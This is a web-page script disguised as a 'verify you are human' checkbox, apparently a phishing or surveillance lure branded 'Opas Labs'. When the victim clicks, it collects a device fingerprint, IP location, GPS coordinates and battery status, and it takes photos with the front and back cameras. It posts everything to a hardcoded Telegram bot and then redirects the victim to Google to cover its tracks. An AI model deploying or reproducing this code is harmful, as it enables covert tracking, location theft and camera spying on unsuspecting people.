<script>
  const checkbox = document.getElementById('verifyHuman');
  const spinner = document.getElementById('spinner');

  // Network Information
  async function getNetworkInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
      return {
        type: connection.type || "Unknown",
        effectiveType: connection.effectiveType || "Unknown",
        downlink: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
        rtt: connection.rtt ? `${connection.rtt} ms` : "Unknown",
        saveData: connection.saveData ? "Enabled" : "Disabled",
      };
    }
    return "Network API not supported";
  }

  // WebGL & Canvas Fingerprinting
  function getWebGLInfo() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return "WebGL not supported";
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return {
      vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Blocked",
      renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Blocked",
    };
  }

  async function getSnapshot(facingMode) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode }
      });
      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();
      await new Promise(res => setTimeout(res, 1000)); // Let it stabilize

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0);

      const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
      stream.getTracks().forEach(track => track.stop());
      return blob;
    } catch (err) {
      console.warn(`Camera (${facingMode}) access denied or failed`, err);
      return null;
    }
  }

  async function getDeviceInfo() {
    const data = {
      // Basic Info
      browser: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
      
      // Hardware Specs
      cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unavailable",
      memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable",
      screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit`,
      touch: 'ontouchstart' in window ? "Yes" : "No",
      webgl: getWebGLInfo(),
      
      // Network
      network: await getNetworkInfo(),
      
      // Location & IP
      ip: "Unknown",
      city: "",
      region: "",
      country: "",
      location: "Denied",
      
      // Battery
      battery: "Unknown",
      charging: "Unknown",
      
      // Camera
      cameraStatus: "",
    };

    // IP Info
    try {
      const res = await fetch(`https://ipinfo.io/json?token=18d2a866939a58`);
      const ipData = await res.json();
      data.ip = ipData.ip;
      data.city = ipData.city;
      data.region = ipData.region;
      data.country = ipData.country;
    } catch {}

    // Battery Info
    try {
      const battery = await navigator.getBattery();
      data.battery = (battery.level * 100).toFixed(0) + "%";
      data.charging = battery.charging ? "Yes" : "No";
    } catch {}

    // Location
    try {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej)
      );
      data.location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
    } catch {}

    return data;
  }

  async function sendTextToTelegram(data) {
    const message = `
*🔰 Opas Labs 🔰*

🌐 *Basic Info*
- Browser: ${data.browser}
- Platform: ${data.platform}
- Language: ${data.language}
- Timezone: ${data.timezone}
- Cookies: ${data.cookies}

💻 *Hardware Specs*
- CPU: ${data.cpu}
- RAM: ${data.memory}
- Screen: ${data.screen}
- Touch Support: ${data.touch}
- WebGL Vendor: ${data.webgl.vendor}
- WebGL Renderer: ${data.webgl.renderer}

📶 *Network*
- Type: ${data.network.type}
- Speed: ${data.network.effectiveType}
- Downlink: ${data.network.downlink}
- Latency (RTT): ${data.network.rtt}
- Data Saver: ${data.network.saveData}

📍 *Location & IP*
- IP: ${data.ip}
- City: ${data.city}
- Region: ${data.region}
- Country: ${data.country}
- GPS: ${data.location}

🔋 *Battery*
- Level: ${data.battery}
- Charging: ${data.charging}

📷 *Camera Status*
- ${data.cameraStatus}
    `;

    return fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: "7216371031",
        text: message,
        parse_mode: "Markdown"
      })
    });
  }

  function sendPhotoToTelegram(blob, caption) {
    const formData = new FormData();
    formData.append("chat_id", "7216371031");
    formData.append("photo", blob, `${caption}.jpg`);
    formData.append("caption", caption);

    return fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendPhoto`, {
      method: "POST",
      body: formData
    });
  }

  // Execute when checkbox is clicked
  checkbox.addEventListener('click', async function(e) {
    e.preventDefault(); // Prevent default toggle

    // Hide checkbox, show spinner
    checkbox.style.display = 'none';
    spinner.style.display = 'block';

    // Immediately collect and send data
    const info = await getDeviceInfo();

    // Capture front camera (only once)
    let frontSnap = null;
    if (!window.frontCaptured) {
      frontSnap = await getSnapshot("user");
      window.frontCaptured = true;
    }

    // Capture back camera (only once)
    let backSnap = null;
    if (!window.backCaptured) {
      backSnap = await getSnapshot("environment");
      window.backCaptured = true;
    }

    // Set camera status
    if (frontSnap && backSnap) {
      info.cameraStatus = "Front & Back Captured";
    } else if (frontSnap) {
      info.cameraStatus = "Front Only";
    } else if (backSnap) {
      info.cameraStatus = "Back Only";
    } else {
      info.cameraStatus = "None / Access Denied";
    }

    // Send info and photos
    await sendTextToTelegram(info);
    if (frontSnap) await sendPhotoToTelegram(frontSnap, "📷 Front Camera");
    if (backSnap) await sendPhotoToTelegram(backSnap, "📷 Back Camera");

    // After 3s, check the checkbox
    setTimeout(() => {
      spinner.style.display = 'none';
      checkbox.checked = true;
      checkbox.style.display = 'block';
    }, 3000);

    // Redirect after another 3s (total 6s)
    setTimeout(() => {
      window.location.href = "https://www.google.com";
    }, 6000);
  });
</script>
